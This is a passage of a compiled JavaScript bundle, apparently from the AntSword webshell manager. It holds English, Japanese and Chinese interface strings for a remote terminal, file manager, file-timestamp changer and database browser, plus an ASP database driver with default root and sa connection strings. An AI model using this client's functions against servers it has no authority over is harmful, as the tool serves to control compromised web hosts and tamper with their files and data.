	        error: function error(err) {
	          return 'Delete configuration failed!<br/>' + err;
	        }
	      }
	    }
	  },
	  settings: {
	    about: {
	      title: 'About'
	    },
	    language: {
	      title: 'Language setting',
	      toolbar: {
	        save: 'Save'
	      },
	      form: {
	        label: 'Select language',
	        zh: '简体中文',
	        en: 'English'
	      },
	      success: 'Setting language success!',
	      confirm: {
	        content: 'Restart the application?',
	        title: 'Setting language'
	      }
	    },
	    update: {
	      title: 'Check update',
	      toolbar: {
	        check: 'Check'
	      }
	    }
	  },
	  plugin: {
	    error: function error(err) {
	      return 'Load plugin center failed!<br/>' + err;
	    }
	  }
	};

/***/ },
/* 71 */
/***/ function(module, exports) {

	'use strict';

	//
	// language::jp
	// !warning: 此模板并未完全翻译完毕，如若加载可能出错。解决办法：复制`en.jsx`模板然后翻译替换。。
	//
	module.exports = {
	  toastr: {
	    info: 'プロンプト',
	    error: '間違いました',
	    warning: '警告の',
	    success: 'サクセス'
	  },
	  menubar: {
	    main: {
	      title: 'antSword',
	      about: 'プログラムについて',
	      update: '更新プログラムの確認',
	      quit: 'プログラムを終了'
	    },
	    shell: {
	      title: 'データ',
	      add: 'データを追加します',
	      dump: 'データのエクスポート',
	      import: 'データのインポート',
	      clear: 'データを消去'
	    },
	    edit: {
	      title: 'エディタ',
	      undo: '失効',
	      redo: 'やり直し',
	      cut: 'シャー',
	      copy: 'コピー',
	      paste: 'スティック',
	      selectall: '全て選択'
	    },
	    settings: {
	      title: 'セットアップ',
	      language: {
	        title: '表示言語',
	        zh: '简体中文',
	        en: 'English'
	      }
	    },
	    debug: {
	      title: 'デバッグ作業',
	      refresh: 'リフレッシュ',
	      dev: '開発者ツール'
	    }
	  },
	  shellmanager: {
	    title: 'リストの管理',
	    contextmenu: {
	      terminal: '仮想ターミナル',
	      filemanager: 'ファイル管理',
	      database: 'データ操作',
	      add: 'データを追加します',
	      edit: 'データの編集',
	      delete: 'データの削除',
	      move: 'モバイルデータ',
	      search: '検索データ',
	      plugin: 'ロードプラグイン',
	      clearCache: 'キャッシュを空に',
	      clearAllCache: 'すべてクリアキャッシュ'
	    },
	    category: {
	      title: 'カテゴリー',
	      default: 'デフォルト',
	      toolbar: {
	        add: '追加',
	        del: '削除'
	      },
	      add: {
	        title: 'カテゴリを追加します'
	      },
	      del: {
	        title: 'カテゴリを削除',
	        confirm: 'まだこのカテゴリーを削除してください？ （データはクリアされます）',
	        success: function success(category) {
	          return 'カテゴリは正常に削除（' + category + '）！';
	        },
	        error: function error(category, err) {
	          return 'カテゴリを削除（' + category + '）失敗！<br/>' + err;
	        }
	      }
	    },
	    list: {
	      title: 'データ管理',
	      grid: {
	        url: 'URLアドレス',
	        ip: 'IPアドレス',
	        addr: '物理的な位置',
	        ctime: '作成',
	        utime: '更新'
	      },
	      add: {
	        title: 'データを追加します',
	        toolbar: {
	          add: '追加',
	          clear: '明確な'
	        },
	        form: {
	          url: 'URLアドレス',
	          pwd: '接続パスワード',
	          encode: 'エンコーディング設定',
	          type: '接続タイプ',
	          encoder: 'エンコーダ'
	        },
	        warning: 'フルを入力してください！',
	        success: 'データの成功を追加！',
	        error: function error(err) {
	          return 'データの追加に失敗しました！<br/>' + err;
	        }
	      },
	      edit: {
	        title: function title(url) {
	          return 'データの編集（' + url + '）';
	        },
	        toolbar: {
	          save: '保存',
	          clear: '明確な'
	        },
	        form: {
	          url: 'URLアドレス',
	          pwd: '接続パスワード',
	          encode: 'エンコーディング設定',
	          type: '接続タイプ',
	          encoder: 'エンコーダ'
	        },
	        warning: 'フルを入力してください！',
	        success: 'データの更新成功！',
	        error: function error(err) {
	          return '更新データに失敗しました！<br/>' + err;
	        }
	      },
	      del: {
	        title: 'データの削除',
	        confirm: function confirm(len) {
	          return '選択された' + len + '記事のデータを削除してください？';
	        },
	        success: function success(len) {
	          return len + '正常に削除されたデータ！';
	        },
	        error: function error(err) {
	          return '削除に失敗しました！<br/>' + err;
	        }
	      },
	      move: {
	        success: function success(num) {
	          return 'データが正常に' + num + 'を移動しました！';
	        },
	        error: function error(err) {
	          return 'モバイルデータに失敗しました！<br/>' + err;
	        }
	      },
	      clearCache: {
	        title: 'キャッシュを空に',
	        confirm: 'OKキャッシュを空？',
	        success: 'キャッシュを空にするには、準備ができています！',
	        error: function error(err) {
	          return '空のキャッシュに失敗しました！<br/>' + err;
	        }
	      },
	      clearAllCache: {
	        title: 'キャッシュを空に',
	        confirm: '[OK]をクリアし、すべてのデータをキャッシュされましたか？',
	        success: '空のキャッシュ全体が終了！',
	        error: function error(err) {
	          return '空のキャッシュ全体が失敗しました！<br/>' + err;
	        }
	      }
	    }
	  },
	  terminal: {
	    title: '仮想ターミナル',
	    banner: {
	      title: '基本情報',
	      drive: 'ディスクリスト',
	      system: 'システム情報',
	      user: '現在のユーザー',
	      path: '現在パス'
	    }
	  },
	  filemanager: {
	    title: 'ファイル管理',
	    delete: {
	      title: 'ファイルを削除します',
	      confirm: function confirm(num) {
	        return 'あなたは' + (typeof num === 'number' ? num + ' 个文件' : num) + 'のファイルを削除してもよろしいですか？';
	      },
	      success: function success(path) {
	        return 'ファイルの成功を削除！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return 'ファイル[' + path + ']を削除できませんでした！' + (err ? '<br/>' + err : '');
	      }
	    },
	    paste: {
	      success: function success(path) {
	        return 'ファイルの成功を貼り付け！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return '貼り付けファイル[' + path + ']が失敗しました！' + (err ? '<br/>' + err : '');
	      }
	    },
	    rename: {
	      title: '名前の変更',
	      success: 'ファイルの成功の名前を変更します！',
	      error: function error(err) {
	        return '失敗したファイルの名前を変更します！' + (err ? '<br/>' + err : '');
	      }
	    },
	    createFolder: {
	      title: '新規カタログ',
	      value: '新しいディレクトリ',
	      success: function success(path) {
	        return '新規カタログの成功！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return '新しいディレクトリ[' + path + ']は失敗しました！' + (err ? '<br/>' + err : '');
	      }
	    },
	    createFile: {
	      title: '新しいファイル',
	      value: '新しいファイル.txt',
	      success: function success(path) {
	        return '新規ファイルの成功！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return '新しいファイル[' + path + ']は失敗しました！' + (err ? '<br/>' + err : '');
	      }
	    },
	    retime: {
	      title: '時間を変更します',
	      success: function success(path) {
	        return 'ファイルの時間の成功を変更！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return '変更文書[' + path + ']は失敗しました！' + (err ? '<br/>' + err : '');
	      }
	    },
	    wget: {
	      title: 'Wgetのダウンロードファイル',
	      check: 'URLアドレスが正しくありません！',
	      task: {
	        name: 'WGETダウンロード',
	        start: 'ダウンロードを開始します..',
	        success: '成功をダウンロード！',
	        failed: function failed(ret) {
	          return '失敗:' + ret;
	        },
	        error: function error(err) {
	          return '間違いました:' + err;
	        }
	      }
	    },
	    upload: {
	      task: {
	        name: 'アップロード',
	        failed: function failed(err) {
	          return '失敗:' + err;
	        },
	        error: function error(err) {
	          return '間違いました:' + err;
	        }
	      },
	      success: function success(path) {
	        return 'ファイルの成功をアップロード！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return 'ファイルをアップロードし、[' + path + ']は失敗しました！' + err;
	      }
	    },
	    folder: {
	      title: 'ディレクトリのリスト'
	    },
	    files: {
	      title: 'ファイルリスト',
	      bookmark: {
	        add: 'ブックマークに追加',
	        del: 'ブックマークを削除します',
	        clear: 'クリアしおり'
	      },
	      toolbar: {
	        new: '新',
	        folder: 'ディレクトリ',
	        file: 'ファイル',
	        wget: 'Wgetのダウンロード',
	        upload: 'アップロード',
	        up: '上層',
	        refresh: '晴らす',
	        home: 'ホーム',
	        bookmark: 'マーク',
	        read: '読みます'
	      },
	      prompt: {
	        add: {
	          title: 'ブックマークに追加',
	          success: function success(path) {
	            return 'ブックマークの成功を追加！<br/>' + path;
	          }
	        },
	        remove: {
	          title: 'ブックマークを削除します',
	          confirm: 'このブックマークを削除してください？',
	          success: 'ブックマークの成功を削除します！'
	        },
	        clear: {
	          title: 'クリアしおり',
	          confirm: '[OK]をクリアすべてのブックマーク？',
	          success: 'すべてのブックマークの成功クリア！'
	        }
	      },
	      grid: {
	        header: {
	          name: '名前',
	          time: '期日',
	          size: 'サイズ',
	          attr: 'プロパティ'
	        },
	        contextmenu: {
	          paste: {
	            title: 'ファイルの貼り付け',
	            all: 'すべてのリスト',
	            clear: {
	              title: '一覧をクリアします',
	              info: '空のクリップボード'
	            }
	          },
	          preview: 'プレビュードキュメント',
	          edit: 'ファイルを編集します',
	          delete: 'ファイルを削除します',
	          rename: 'ファイル名の変更',
	          refresh: 'ディレクトリを更新',
	          wget: 'WGETダウンロード',
	          upload: 'ファイルをアップロード',
	          download: 'ファイルのダウンロード',
	          modify: '変更ファイルの時間',
	          copy: {
	            title: 'ファイルのコピー',
	            warning: function warning(id) {
	              return 'これは、クリップボードに追加されました！<br/>' + id;
	            },
	            info: function info(id) {
	              return 'クリップボードにファイルを追加します。<br/>' + id;
	            }
	          },
	          create: {
	            title: '新',
	            folder: 'ディレクトリ',
	            file: 'ファイル'
	          }
	        }
	      }
	    },
	    editor: {
	      title: function title(path) {
	        return 'エディタ: ' + path;
	      },
	      toolbar: {
	        save: '保存',
	        mode: 'ハイライト',
	        encode: 'コーディング'
	      },
	      loadErr: function loadErr(err) {
	        return '読み込みエラーファイル！<br/>' + err;
	      },
	      success: function success(path) {
	        return 'ファイルの成功を節約！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return 'ファイルを保存し、[' + path + ']に失敗しました！' + err;
	      }
	    },
	    tasks: {
	      title: 'タスクリスト',
	      grid: {
	        header: {
	          name: '名前',
	          desc: '簡単な紹介',
	          status: '地位',
	          stime: '作成',
	          etime: '完了時間'
	        }
	      }
	    },
	    download: {
	      title: 'ファイルのダウンロード',
	      task: {
	        name: 'ダウンロード',
	        wait: 'ダウンロードするための準備',
	        cancel: 'ダウンロードをキャンセル',
	        start: 'ダウンロードを開始します',
	        success: '成功をダウンロード',
	        error: function error(err) {
	          return 'エラー:' + err;
	        }
	      },
	      error: function error(name, err) {
	        return 'ファイルのダウンロード[' + path + ']エラー！<br/>' + err;
	      },
	      success: function success(name) {
	        return 'ファイルのダウンロード[' + path + ']成功！';
	      }
	    }
	  }
	};

/***/ },
/* 72 */
/***/ function(module, exports) {

	'use strict';

	//
	// language::zh
	//
	module.exports = {
	  title: '中国蚁剑',
	  toastr: {
	    info: '提示',
	    error: '错误',
	    warning: '警告',
	    success: '成功'
	  },
	  menubar: {
	    main: {
	      title: 'AntSword',
	      about: '关于程序',
	      plugin: '插件中心',
	      settings: '系统设置',
	      language: '语言设置',
	      update: '检查更新',
	      quit: '退出程序'
	    },
	    shell: {
	      title: '数据',
	      add: '添加数据',
	      search: '搜索数据',
	      dump: '导出数据',
	      import: '导入数据',
	      clear: '清空数据'
	    },
	    edit: {
	      title: '编辑',
	      undo: '撤销',
	      redo: '重做',
	      cut: '剪切',
	      copy: '复制',
	      paste: '粘贴',
	      selectall: '全选'
	    },
	    window: {
	      title: '窗口',
	      next: '下个窗口',
	      prev: '上个窗口',
	      close: '关闭窗口'
	    }
	  },
	  shellmanager: {
	    title: '列表管理',
	    contextmenu: {
	      terminal: '虚拟终端',
	      filemanager: '文件管理',
	      database: '数据操作',
	      add: '添加数据',
	      edit: '编辑数据',
	      delete: '删除数据',
	      move: '移动数据',
	      search: '搜索数据',
	      plugin: '加载插件',
	      pluginCenter: '插件中心',
	      clearCache: '清空缓存',
	      clearAllCache: '清空所有缓存'
	    },
	    category: {
	      title: '分类目录',
	      default: '默认分类',
	      toolbar: {
	        add: '添加',
	        del: '删除'
	      },
	      add: {
	        title: '添加分类'
	      },
	      del: {
	        title: '删除分类',
	        confirm: '确定删除此分类吗？（数据将清空）',
	        success: function success(category) {
	          return '成功删除分类（' + category + '）！';
	        },
	        error: function error(category, err) {
	          return '删除分类（' + category + '）失败！<br/>' + err;
	        }
	      }
	    },
	    list: {
	      title: '数据管理',
	      grid: {
	        url: 'URL地址',
	        ip: 'IP地址',
	        addr: '物理位置',
	        ctime: '创建时间',
	        utime: '更新时间'
	      },
	      add: {
	        title: '添加数据',
	        toolbar: {
	          add: '添加',
	          clear: '清空'
	        },
	        form: {
	          url: 'URL地址',
	          pwd: '连接密码',
	          encode: '编码设置',
	          type: '连接类型',
	          encoder: '编码器'
	        },
	        warning: '请输入完整！',
	        success: '添加数据成功！',
	        error: function error(err) {
	          return '添加数据失败！<br/>' + err;
	        }
	      },
	      edit: {
	        title: function title(url) {
	          return '编辑数据（' + url + '）';
	        },
	        toolbar: {
	          save: '保存',
	          clear: '清空'
	        },
	        form: {
	          url: 'URL地址',
	          pwd: '连接密码',
	          encode: '编码设置',
	          type: '连接类型',
	          encoder: '编码器'
	        },
	        warning: '请输入完整！',
	        success: '更新数据成功！',
	        error: function error(err) {
	          return '更新数据失败！<br/>' + err;
	        }
	      },
	      del: {
	        title: '删除数据',
	        confirm: function confirm(len) {
	          return '确定删除选中的' + len + '条数据吗？';
	        },
	        success: function success(len) {
	          return '成功删除' + len + '条数据！';
	        },
	        error: function error(err) {
	          return '删除失败！<br/>' + err;
	        }
	      },
	      move: {
	        success: function success(num) {
	          return '成功移动' + num + '条数据！';
	        },
	        error: function error(err) {
	          return '移动数据失败！<br/>' + err;
	        }
	      },
	      clearCache: {
	        title: '清空缓存',
	        confirm: '确定清空此缓存吗？',
	        success: '清空缓存完毕！',
	        error: function error(err) {
	          return '清空缓存失败！<br/>' + err;
	        }
	      },
	      clearAllCache: {
	        title: '清空缓存',
	        confirm: '确定清空所有缓存数据吗？',
	        success: '清空全部缓存完毕！',
	        error: function error(err) {
	          return '清空全部缓存失败！<br/>' + err;
	        }
	      }
	    }
	  },
	  terminal: {
	    title: '虚拟终端',
	    banner: {
	      title: '基础信息',
	      drive: '磁盘列表',
	      system: '系统信息',
	      user: '当前用户',
	      path: '当前路径'
	    }
	  },
	  filemanager: {
	    title: '文件管理',
	    delete: {
	      title: '删除文件',
	      confirm: function confirm(num) {
	        return '你确定要删除 ' + (typeof num === 'number' ? num + ' 个文件' : num) + ' 吗？';
	      },
	      success: function success(path) {
	        return '删除文件成功！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return '删除文件 [' + path + '] 失败！' + (err ? '<br/>' + err : '');
	      }
	    },
	    paste: {
	      success: function success(path) {
	        return '粘贴文件成功！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return '粘贴文件 [' + path + '] 失败！' + (err ? '<br/>' + err : '');
	      }
	    },
	    rename: {
	      title: '重命名',
	      success: '重命名文件成功！',
	      error: function error(err) {
	        return '重命名文件失败！' + (err ? '<br/>' + err : '');
	      }
	    },
	    createFolder: {
	      title: '新建目录',
	      value: '新目录',
	      success: function success(path) {
	        return '新建目录成功！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return '新建目录 [' + path + '] 失败！' + (err ? '<br/>' + err : '');
	      }
	    },
	    createFile: {
	      title: '新建文件',
	      value: '新文件.txt',
	      success: function success(path) {
	        return '新建文件成功！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return '新建文件 [' + path + '] 失败！' + (err ? '<br/>' + err : '');
	      }
	    },
	    retime: {
	      title: '更改时间',
	      success: function success(path) {
	        return '更改文件时间成功！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return '更改文件时间 [' + path + '] 失败！' + (err ? '<br/>' + err : '');
	      }
	    },
	    wget: {
	      title: 'Wget下载文件',
	      check: 'URL地址不正确！',
	      task: {
	        name: 'WGET下载',
	        start: '开始下载..',
	        success: '下载成功！',
	        failed: function failed(ret) {
	          return '失败:' + ret;
	        },
	        error: function error(err) {
	          return '错误:' + err;
	        }
	      }
	    },
	    upload: {
	      task: {
	        name: '上传',
	        failed: function failed(err) {
	          return '失败:' + err;
	        },
	        error: function error(err) {
	          return '出错:' + err;
	        }
	      },
	      success: function success(path) {
	        return '上传文件成功！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return '上传文件 [' + path + '] 失败！' + err;
	      }
	    },
	    folder: {
	      title: '目录列表'
	    },
	    files: {
	      title: '文件列表',
	      bookmark: {
	        add: '添加书签',
	        del: '移除书签',
	        clear: '清空书签'
	      },
	      toolbar: {
	        new: '新建',
	        folder: '目录',
	        file: '文件',
	        wget: 'Wget下载',
	        upload: '上传文件',
	        up: '上层',
	        refresh: '刷新',
	        home: '主目录',
	        bookmark: '书签',
	        read: '读取'
	      },
	      prompt: {
	        add: {
	          title: '添加到书签',
	          success: function success(path) {
	            return '添加书签成功！<br/>' + path;
	          }
	        },
	        remove: {
	          title: '移除书签',
	          confirm: '确定移除此书签吗？',
	          success: '移除书签成功！'
	        },
	        clear: {
	          title: '清空书签',
	          confirm: '确定清空所有书签吗？',
	          success: '清空所有书签成功！'
	        }
	      },
	      grid: {
	        header: {
	          name: '名称',
	          time: '日期',
	          size: '大小',
	          attr: '属性'
	        },
	        contextmenu: {
	          paste: {
	            title: '粘贴文件',
	            all: '所有列表',
	            clear: {
	              title: '清空列表',
	              info: '清空剪贴板'
	            }
	          },
	          preview: '预览文件',
	          edit: '编辑文件',
	          delete: '删除文件',
	          rename: '重命名文件',
	          refresh: '刷新目录',
	          wget: 'WGET下载',
	          upload: '上传文件',
	          download: '下载文件',
	          modify: '更改文件时间',
	          copy: {
	            title: '复制文件',
	            warning: function warning(id) {
	              return '已经添加到剪贴板！<br/>' + id;
	            },
	            info: function info(id) {
	              return '添加文件到剪贴板<br/>' + id;
	            }
	          },
	          create: {
	            title: '新建',
	            folder: '目录',
	            file: '文件'
	          }
	        }
	      }
	    },
	    editor: {
	      title: function title(path) {
	        return '编辑: ' + path;
	      },
	      toolbar: {
	        save: '保存',
	        mode: '高亮',
	        encode: '编码'
	      },
	      loadErr: function loadErr(err) {
	        return '加载文件出错！<br/>' + err;
	      },
	      success: function success(path) {
	        return '保存文件成功！<br/>' + path;
	      },
	      error: function error(path, err) {
	        return '保存文件 [' + path + '] 失败！' + err;
	      }
	    },
	    tasks: {
	      title: '任务列表',
	      grid: {
	        header: {
	          name: '名称',
	          desc: '简介',
	          status: '状态',
	          stime: '创建时间',
	          etime: '完成时间'
	        }
	      }
	    },
	    download: {
	      title: '下载文件',
	      task: {
	        name: '下载',
	        wait: '准备下载',
	        cancel: '取消下载',
	        start: '开始下载',
	        success: '下载成功',
	        error: function error(err) {
	          return '出错:' + err;
	        }
	      },
	      error: function error(name, err) {
	        return '下载文件[' + name + ']出错！<br/>' + err;
	      },
	      success: function success(name) {
	        return '下载文件[' + name + ']成功！';
	      }
	    }
	  },
	  database: {
	    list: {
	      title: '配置列表',
	      add: '添加',
	      del: '删除',
	      menu: {
	        add: '添加配置',
	        del: '删除配置'
	      }
	    },
	    query: {
	      title: '执行SQL',
	      exec: '执行',
	      clear: '清空'
	    },
	    result: {
	      title: '执行结果',
	      warning: '操作完毕，但没有结果返回！',
	      error: {
	        database: function database(err) {
	          return '获取数据库列表失败！<br/>' + err;
	        },
	        table: function table(err) {
	          return '获取表数据失败！<br/>' + err;
	        },
	        column: function column(err) {
	          return '获取字段列表失败！<br/>' + err;
	        },
	        query: function query(err) {
	          return '执行SQL失败！<br/>' + err;
	        },
	        parse: '返回数据格式不正确！',
	        noresult: '没有查询结果！'
	      }
	    },
	    form: {
	      title: '添加配置',
	      toolbar: {
	        add: '添加',
	        clear: '清空'
	      },
	      type: '数据库类型',
	      encode: '数据库编码',
	      host: '数据库地址',
	      user: '连接用户',
	      passwd: '连接密码',
	      warning: '请填写完整！',
	      success: '成功添加配置！',
	      del: {
	        title: '删除配置',
	        confirm: '确定删除此配置吗？',
	        success: '删除配置成功！',
	        error: function error(err) {
	          return '删除配置失败！<br/>' + err;
	        }
	      }
	    }
	  },
	  settings: {
	    about: {
	      title: '关于程序'
	    },
	    language: {
	      title: '语言设置',
	      toolbar: {
	        save: '保存'
	      },
	      form: {
	        label: '选择显示语言',
	        zh: '简体中文',
	        en: 'English'
	      },
	      success: '保存语言设置成功！',
	      confirm: {
	        content: '重启应用生效，是否重启？',
	        title: '更改语言'
	      }
	    },
	    update: {
	      title: '检查更新',
	      toolbar: {
	        check: '检查'
	      }
	    }
	  },
	  plugin: {
	    error: function error(err) {
	      return '加载插件中心失败！<br/>' + err;
	    }
	  }
	};

/***/ },
/* 73 */
/***/ function(module, exports, __webpack_require__) {

	var map = {
		"./database/asp/index": 74,
		"./database/aspx/index": 75,
		"./database/custom/index": 76,
		"./database/index": 77,
		"./database/php/index": 79,
		"./filemanager/index": 80,
		"./plugin/index": 85,
		"./settings/index": 86,
		"./shellmanager/index": 90,
		"./terminal/index": 92
	};
	function webpackContext(req) {
		return __webpack_require__(webpackContextResolve(req));
	};
	function webpackContextResolve(req) {
		return map[req] || (function() { throw new Error("Cannot find module '" + req + "'.") }());
	};
	webpackContext.keys = function webpackContextKeys() {
		return Object.keys(map);
	};
	webpackContext.resolve = webpackContextResolve;
	module.exports = webpackContext;
	webpackContext.id = 73;


/***/ },
/* 74 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(Buffer) {'use strict';

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 数据库驱动::ASP
	// 支持数据库:access,sqlserver,mysql
	//

	var ASP = function () {
	  function ASP(opt) {
	    var _this = this;

	    _classCallCheck(this, ASP);

	    this.opt = opt;
	    this.core = this.opt.core;
	    this.manager = this.opt.super;
	    //
	    // * 数据库驱动列表
	    //
	    this.conns = {
	      'dsn': 'Dsn=DsnName;',
	      'mysql': 'Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=',
	      'access': 'Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\\test.mdb',
	      'sqlserver': 'Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=',
	      'sqloledb_1': 'Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);',
	      'sqloledb_1_sspi': 'Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;',
	      'oracle': 'Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;',
	      'microsoft_jet_oledb_4_0': 'Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\\test.mdb'
	    };
	    // 1. 初始化TREE UI
	    this.tree = this.manager.list.layout.attachTree();
	    // 2. 加载数据库配置
	    this.parse();
	    // 3. tree单击::设置当前配置&&激活按钮
	    this.tree.attachEvent('onClick', function (id) {
	      // 更改按钮状态
	      id.startsWith('conn::') ? _this.enableToolbar() : _this.disableToolbar();
	      // 设置当前配置
	      var tmp = id.split('::');
	      var arr = tmp[1].split(':');
	      // 设置当前数据库
	      _this.dbconf = antSword['ipcRenderer'].sendSync('shell-getDataConf', {
	        _id: _this.manager.opt['_id'],
	        id: arr[0]
	      });
	      if (arr.length > 1) {
	        _this.dbconf['database'] = new Buffer(arr[1], 'base64').toString();
	        // 更新SQL编辑器
	        _this.enableEditor();
	        // manager.query.update(this.currentConf);
	      } else {
	          _this.disableEditor();
	        }
	    });
	    // 4. tree双击::加载库/表/字段
	    this.tree.attachEvent('onDblClick', function (id) {
	      var arr = id.split('::');
	      if (arr.length < 2) {
	        throw new Error('ID ERR: ' + id);
	      };
	      switch (arr[0]) {
	        // 获取数据库列表
	        case 'conn':
	          _this.getDatabases(arr[1]);
	          break;
	        // 获取数据库表名
	        case 'database':
	          var _db = arr[1].split(':');
	          _this.getTables(_db[0], new Buffer(_db[1], 'base64').toString());
	          break;
	        // 获取表名字段
	        case 'table':
	          var _tb = arr[1].split(':');
	          _this.getColumns(_tb[0], new Buffer(_tb[1], 'base64').toString(), new Buffer(_tb[2], 'base64').toString());
	          break;
	        // 生成查询SQL语句
	        case 'column':
	          var _co = arr[1].split(':');
	          var table = new Buffer(_co[2], 'base64').toString();
	          var column = new Buffer(_co[3], 'base64').toString();

	          var sql = 'SELECT TOP 20 [' + column + '] FROM [' + table + '] ORDER BY 1 DESC;';
	          _this.manager.query.editor.session.setValue(sql);
	          break;
	      }
	    });
	    // 5. tree右键::功能菜单
	    this.tree.attachEvent('onRightClick', function (id, event) {
	      if (!id.startsWith('conn::')) {
	        return;
	      };
	      _this.tree.selectItem(id);
	      _this.tree.callEvent('onClick', [id]);
	      bmenu([{
	        text: '添加配置',
	        icon: 'fa fa-plus-circle',
	        action: _this.addConf.bind(_this)
	      }, {
	        divider: true
	      }, {
	        text: '删除配置',
	        icon: 'fa fa-remove',
	        action: _this.delConf.bind(_this)
	      }], event);
	    });
	  }

	  // 加载配置列表


	  _createClass(ASP, [{
	    key: 'parse',
	    value: function parse() {
	      // 获取数据
	      var info = antSword['ipcRenderer'].sendSync('shell-findOne', this.manager.opt['_id']);
	      var conf = info['database'] || {};
	      // 刷新UI
	      // 1.清空数据
	      this.tree.deleteChildItems(0);
	      // 2.添加数据
	      var items = [];
	      for (var _ in conf) {
	        items.push({
	          id: 'conn::' + _,
	          // text: `${conf[_]['type']}:\/\/${conf[_]['user']}@${conf[_]['host']}`,
	          text: conf[_]['type'].toUpperCase(),
	          im0: this.manager.list.imgs[0],
	          im1: this.manager.list.imgs[0],
	          im2: this.manager.list.imgs[0]
	        });
	      }
	      // 3.刷新UI
	      this.tree.parse({
	        id: 0,
	        item: items
	      }, 'json');
	      // 禁用按钮
	      this.disableToolbar();
	      this.disableEditor();
	    }

	    // 添加配置

	  }, {
	    key: 'addConf',
	    value: function addConf() {
	      var _this2 = this;

	      var hash = (+new Date() * Math.random()).toString(16).substr(2, 8);
	      // 创建窗口
	      var win = this.manager.win.createWindow(hash, 0, 0, 450, 300);
	      win.setText('添加配置');
	      win.centerOnScreen();
	      win.button('minmax').hide();
	      win.setModal(true);
	      win.denyResize();
	      // 工具栏
	      var toolbar = win.attachToolbar();
	      toolbar.loadStruct([{
	        id: 'add',
	        type: 'button',
	        icon: 'plus-circle',
	        text: '添加'
	      }, {
	        type: 'separator'
	      }, {
	        id: 'clear',
	        type: 'button',
	        icon: 'remove',
	        text: '清空'
	      }]);

	      // form
	      var form = win.attachForm([{ type: 'settings', position: 'label-left', labelWidth: 80, inputWidth: 280 }, { type: 'block', inputWidth: 'auto', offsetTop: 12, list: [{ type: 'combo', label: '数据库类型', readonly: true, name: 'type', options: function () {
	            var ret = [];
	            for (var _ in _this2.conns) {
	              ret.push({
	                text: _.toUpperCase(),
	                value: _
	              });
	            }
	            return ret;
	          }() }, { type: 'input', label: '连接字符串', name: 'conn', required: true, value: 'Dsn=DsnName;', rows: 9 }] }], true);

	      form.attachEvent('onChange', function (_, id) {
	        if (_ !== 'type') {
	          return;
	        };
	        form.setFormData({
	          conn: _this2.conns[id]
	        });
	      });

	      // 工具栏点击事件
	      toolbar.attachEvent('onClick', function (id) {
	        switch (id) {
	          case 'clear':
	            form.clear();
	            break;
	          case 'add':
	            if (!form.validate()) {
	              return '填写完整！';
	              // return toastr.warning(LANG['list']['add']['warning'], LANG_T['warning']);
	            };
	            // 解析数据
	            var data = form.getValues();
	            // 验证是否连接成功(获取数据库列表)
	            var id = antSword['ipcRenderer'].sendSync('shell-addDataConf', {
	              _id: _this2.manager.opt['_id'],
	              data: data
	            });
	            win.close();
	            toastr.success('添加配置成功!');
	            _this2.tree.insertNewItem(0, 'conn::' + id,
	            // `${data['type']}:\/\/${data['user']}@${data['host']}`,
	            data['type'].toUpperCase(), null, _this2.manager.list.imgs[0], _this2.manager.list.imgs[0], _this2.manager.list.imgs[0]);
	            break;
	        }
	      });
	    }

	    // 删除配置

	  }, {
	    key: 'delConf',
	    value: function delConf() {
	      var _this3 = this;

	      var id = this.tree.getSelected().split('::')[1];
	      layer.confirm('确定删除此配置吗？', {
	        icon: 2, shift: 6,
	        title: '删除配置'
	      }, function (_) {
	        layer.close(_);
	        var ret = antSword['ipcRenderer'].sendSync('shell-delDataConf', {
	          _id: _this3.manager.opt['_id'],
	          id: id
	        });
	        if (ret === 1) {
	          toastr.success('删除配置成功！');
	          _this3.tree.deleteItem('conn::' + id);
	          // 禁用按钮
	          _this3.disableToolbar();
	          _this3.disableEditor();
	          // ['edit', 'del'].map(this.toolbar::this.toolbar.disableItem);
	          // this.parse();
	        } else {
	            toastr.error('删除配置失败！<br/>' + ret);
	          }
	      });
	    }

	    // 获取数据库列表

	  }, {
	    key: 'getDatabases',
	    value: function getDatabases(id) {
	      var _this4 = this;

	      this.manager.list.layout.progressOn();
	      // 获取配置
	      var conf = antSword['ipcRenderer'].sendSync('shell-getDataConf', {
	        _id: this.manager.opt['_id'],
	        id: id
	      });
	      this.core['database_' + conf['type']].show_databases({
	        conn: conf['conn'],
	        dbname: ['access', 'microsoft_jet_oledb_4_0'].indexOf(conf['type']) > -1 ? conf['conn'].match(/[\w]+.mdb$/) : 'database'
	      }, function (ret) {
	        var arr = ret.split('\t');
	        if (arr.length === 1 && ret === '') {
	          toastr.warning('执行完毕，没有结果返回');
	          return _this4.manager.list.layout.progressOff();
	        };
	        // 删除子节点
	        _this4.tree.deleteChildItems('conn::' + id);
	        // 添加子节点
	        arr.map(function (_) {
	          if (!_) {
	            return;
	          };
	          var _db = new Buffer(_).toString('base64');
